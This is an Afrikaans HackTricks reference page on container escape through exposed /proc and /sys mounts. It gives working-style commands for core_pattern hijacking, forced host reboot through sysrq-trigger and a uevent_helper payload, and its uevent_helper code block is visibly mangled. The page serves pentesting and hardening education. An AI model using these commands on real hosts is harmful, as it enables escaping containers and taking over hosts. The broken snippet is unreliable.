# Sensitiewe Monteerplekke

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

Die blootstelling van `/proc` en `/sys` sonder behoorlike naamsruimte-isolasie stel beduidende sekuriteitsrisiko's bloot, insluitend vergroting van die aanvalsoppervlak en inligtingsoffening. Hierdie gids bevat sensitiewe lêers wat, indien verkeerd geconfigureer of deur 'n ongemagtigde gebruiker benader, kan lei tot die ontsnapping van die houer, aanpassing van die gasheer, of die voorsiening van inligting wat verdere aanvalle kan ondersteun. Byvoorbeeld, die verkeerde montering van `-v /proc:/host/proc` kan AppArmor-beskerming omseil as gevolg van sy pad-gebaseerde aard, wat `/host/proc` onbeskerm agterlaat.

**Jy kan verdere besonderhede van elke potensiële kwesbaarheid vind in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Kwesbaarhede

### `/proc/sys`

Hierdie gids maak toegang moontlik om kernelveranderlikes te wysig, gewoonlik via `sysctl(2)`, en bevat verskeie subgidse van belang:

#### **`/proc/sys/kernel/core_pattern`**

* Beskryf in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Maak dit moontlik om 'n program te definieer om uit te voer wanneer 'n kernlêer gegenereer word met die eerste 128 byte as argumente. Dit kan lei tot kode-uitvoering as die lêer begin met 'n pyp `|`.
*   **Toets- en Uitbuitingvoorbeeld**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Toets skryftoegang
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Stel aangepaste hanterer in
sleep 5 && ./crash & # Trigger hanterer
```

#### **`/proc/sys/kernel/modprobe`**

* Uiteengesit in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Bevat die pad na die kernelmodule-laaiers, aangeroep vir die laai van kernelmodules.
*   **Toegangkontrole-voorbeeld**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Verwys in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* 'n Globale vlag wat beheer of die kernel paniekerig word of die OOM-killer aanroep wanneer 'n OOM-toestand plaasvind.

#### **`/proc/sys/fs`**

* Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêersisteem.
* Skryftoegang kan verskeie ontkenning-van-diens-aanvalle teen die gasheer moontlik maak.

#### **`/proc/sys/fs/binfmt_misc`**

* Maak dit moontlik om tolke vir nie-inheemse binêre formate te registreer op grond van hul toorgetal.
* Kan lei tot bevoorregte eskalasie of toegang tot die root-skoot as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
* Relevant uitbuiting en verduideliking:
* [Armoedige man se rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Diepgaande handleiding: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Ander in `/proc`

#### **`/proc/config.gz`**

* Kan die kernelkonfigurasie onthul as `CONFIG_IKCONFIG_PROC` geaktiveer is.
* Nuttig vir aanvallers om kwesbaarhede in die lopende kernel te identifiseer.

#### **`/proc/sysrq-trigger`**

* Maak dit moontlik om Sysrq-opdragte aan te roep, wat moontlik onmiddellike stelselherlaaie of ander kritieke aksies kan veroorsaak.
*   **Gasheerherlaaivoorbeeld**:

```bash
echo b > /proc/sysrq-trigger # Herlaai die gasheer
```

#### **`/proc/kmsg`**

* Stel kernelringbufferboodskappe bloot.
* Kan help met kernel-uitbuitings, adreslekke, en die voorsiening van sensitiewe stelselinligting.

#### **`/proc/kallsyms`**

* Lys kernel-uitgevoerde simbole en hul adresse.
* Essensieel vir die ontwikkeling van kernel-uitbuitings, veral vir die oorkom van KASLR.
* Adresinligting is beperk met `kptr_restrict` ingestel op `1` of `2`.
* Besonderhede in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Koppel met die kernelgeheue-toestel `/dev/mem`.
* Histories vatbaar vir bevoorregte eskalasie-aanvalle.
* Meer oor [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Verteenwoordig die stelsel se fisiese geheue in ELF-kernformaat.
* Lees kan gasheerstelsel- en ander houergeheue-inhoud uitlek.
* 'n Groot lêergrootte kan lei tot leesprobleme of sagtewarestortings.
* Gedetailleerde gebruik in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Alternatiewe koppelvlak vir `/dev/kmem`, wat die kernel virtuele geheue verteenwoordig.
* Maak lees en skryf moontlik, dus direkte aanpassing van kernelgeheue.

#### **`/proc/mem`**

* Alternatiewe koppelvlak vir `/dev/mem`, wat fisiese geheue verteenwoordig.
* Maak lees en skryf moontlik, aanpassing van alle geheue vereis die oplossing van virtuele na fisiese adresse.

#### **`/proc/sched_debug`**

* Gee prosesbeplanningsinligting terug, om PID-naamsruimtebeskerming te omseil.
* Stel prosesname, ID's, en cgroup-identifiseerders bloot.

#### **`/proc/[pid]/mountinfo`**

* Verskaf inligting oor koppelplekke in die proses se koppelnaamruimte.
* Stel die ligging van die houer `rootfs` of beeld bloot.

### `/sys` Kwesbaarhede

#### **`/sys/kernel/uevent_helper`**

* Gebruik vir die hanteer van kerneltoestel `uevents`.
* Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer wanneer `uevent`-triggers plaasvind.
*   **Voorbeeld vir Uitbuiting**: %%%bash

## Skep 'n lading

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

## Vind gasheerpad vanaf OverlayFS-koppelvlak vir houer

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

## Stel uevent\_helper in op skadelike helper

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

## Roep 'n uevent af

echo change > /sys/class/mem/null/uevent

## Lees die uitset

cat /output %%%
#### **`/sys/class/thermal`**

* Beheer temperatuurinstellings, moontlik veroorsaak DoS aanvalle of fisiese skade.

#### **`/sys/kernel/vmcoreinfo`**

* Lek kernel adresse, moontlik kompromitteer KASLR.

#### **`/sys/kernel/security`**

* Bevat `securityfs` koppelvlak, wat konfigurasie van Linux Security Modules soos AppArmor moontlik maak.
* Toegang kan 'n houer in staat stel om sy MAC-stelsel uit te skakel.

#### **`/sys/firmware/efi/vars` en `/sys/firmware/efi/efivars`**

* Blootstelling van koppelvlakke vir interaksie met EFI veranderlikes in NVRAM.
* Verkeerde konfigurasie of uitbuiting kan lei tot 'n baksteen laptop of 'n onopstartbare gasheer masjien.

#### **`/sys/kernel/debug`**

* `debugfs` bied 'n "geen reëls" foutopsporingskoppelvlak na die kernel.
* Geskiedenis van sekuriteitskwessies as gevolg van sy onbeperkte aard.

### Verwysings

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Begrip en Versterking van Linux Houers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Misbruik van Bevoorregte en Onbevoorregte Linux Houers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **laai HackTricks in PDF af** Kyk na die [**SUBSKRIPSIEPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
